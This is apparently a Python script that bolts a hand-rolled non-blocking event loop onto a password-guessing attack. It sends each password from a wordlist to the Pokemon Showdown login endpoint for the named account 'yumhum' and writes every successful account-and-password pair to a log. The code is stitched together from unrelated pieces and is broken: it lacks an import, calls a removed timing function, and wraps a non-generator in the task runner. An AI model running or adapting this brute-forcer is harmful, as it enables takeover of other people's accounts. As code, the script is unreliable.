from selectors import DefaultSelector, EVENT_WRITE, EVENT_READ
import socket
from time import clock
import os
import config
import requests
from re import findall
start = clock()
selector = DefaultSelector()
n_jobs = 0

class Future:
    def __init__(self):
        self.callbacks = []

    def resolve(self):
        callbacks = self.callbacks
        self.callbacks = []
        for fn in callbacks:
            fn()

class Task:
    def __init__(self, coro):
        self.coro = coro
        self.step()

    def step(self):
        try:
            next_future = next(self.coro)
        except StopIteration:
            return

        next_future.callbacks.append(self.step)

def get(path):
    global n_jobs
    n_jobs += 1
    s = socket.socket()
    s.setblocking(False)
    try:
        s.connect(('localhost', 5000))
    except BlockingIOError:
        pass

    f = Future()
    selector.register(s.fileno(), EVENT_WRITE, f)
    yield f
    selector.unregister(s.fileno())

    s.send(('GET %s HTTP/1.0\r\n\r\n' % path).encode())
    buf = []

    f = Future()
    selector.register(s.fileno(), EVENT_READ, f)

    while True:
        yield f
        chunk = s.recv(1000)
        if chunk:
            buf.append(chunk)
        else:
            break

    # Finished.
    selector.unregister(s.fileno())
    s.close()
    print((b''.join(buf)).decode().split('\n')[0])
    n_jobs -= 1

    
import os
import config
import requests
from re import findall
from config import *


def attempt_login(account, passwd):
    """Takes an account name and password
    as arguments and returns true
    if the login is successful
    otherwise returns []"""
    request = requests.post("http://play.pokemonshowdown.com/~~showdown/action.php",
                            data={'act': "login",
                                  'name': account,
                                  'pass': passwd,
                                  'challengekeyid': '3',
                                  'challenge': ""})
    #return request.text
    if findall("\"loggedin\":true", str(request.text)):
        with open(config.logs, 'a') as logs:
            logs.write(account+": "+passwd+'\n')
            os.startfile(config.logs)
        return 'HIT'
    else:
        return 'MISS'    

PATH = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))+"\\"

with open(PATH+'passwds.txt') as passwds:
    passwds = [passwd.rstrip() for passwd in passwds]

for passwd in passwds:
    Task(attempt_login('yumhum', passwd))
print(clock() - start)

while n_jobs:
    events = selector.select()
    for key, mask in events:
        future = key.data
        future.resolve()


